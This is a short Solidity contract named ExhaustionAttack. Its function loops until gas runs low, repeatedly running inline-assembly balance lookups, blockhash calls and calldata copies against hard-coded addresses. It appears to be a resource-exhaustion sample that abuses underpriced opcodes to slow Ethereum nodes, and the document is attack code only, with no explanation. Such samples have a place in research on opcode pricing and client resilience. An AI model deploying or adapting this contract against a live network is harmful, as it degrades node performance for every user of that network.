pragma solidity ^0.5.0;

contract ExhaustionAttack {
    function loop() public {

        uint g = gasleft();

        while(g > 50000) {
            assembly {
                pop(balance(0x1d18e6ece8b0cdbea6eb485ab61a))
                pop(0x49f8c33edeea6ac2fe8a)
                pop(balance(0x25dfb360fa775a))
                calldatacopy(0x1f, 0x1f, 0x1f)
                // pop(0x421437ba67fe0e)
                pop(blockhash(address()))
            }
            g = gasleft();
        }
    }
}